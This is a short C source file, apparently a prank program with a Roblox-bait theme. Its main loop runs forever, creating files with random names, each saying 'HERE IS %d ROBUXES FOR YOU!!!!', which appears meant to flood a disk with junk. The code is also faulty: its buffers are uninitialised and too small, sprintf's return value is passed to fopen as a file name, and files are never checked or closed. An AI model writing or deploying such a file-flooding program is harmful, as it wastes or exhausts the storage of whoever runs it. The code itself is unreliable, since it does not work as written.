#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>

unsigned long mix(unsigned long a, unsigned long b, unsigned long c) {
	a=a-b;  a=a-c;  a=a^(c >> 13);
	b=b-c;  b=b-a;  b=b^(a << 8);
	c=c-a;  c=c-b;  c=c^(b >> 13);
	a=a-b;  a=a-c;  a=a^(c >> 12);
	b=b-c;  b=b-a;  b=b^(a << 16);
	c=c-a;  c=c-b;  c=c^(b >> 5);
	a=a-b;  a=a-c;  a=a^(c >> 3);
	b=b-c;  b=b-a;  b=b^(a << 10);
	c=c-a;  c=c-b;  c=c^(b >> 15);
	return c;
}


int main() {
	unsigned long seed = mix(clock(), time(NULL), getpid());
	srand(seed);
	int robuxnum = 0;
	char letters[] = "abcdefghijklmnopqrstuvwxyz0123456789";
	FILE *outfile;

	while (1) {
		char filename[40];
		char ext[3];

		for (int i = 0; i < (rand() % 10 + 30); i++) {
			strncat(filename, &letters[rand() % 36], 1);
		}

		for (int i = 0; i < 3; i++) {
			strncat(ext, &letters[rand() % 36], 1);
		}

		outfile = fopen(sprintf("%s.%s", filename, ext), "w");
		fprintf(outfile, "HERE IS %d ROBUXES FOR YOU!!!!", robuxnum);

		robuxnum++;
	}
	return 0;
}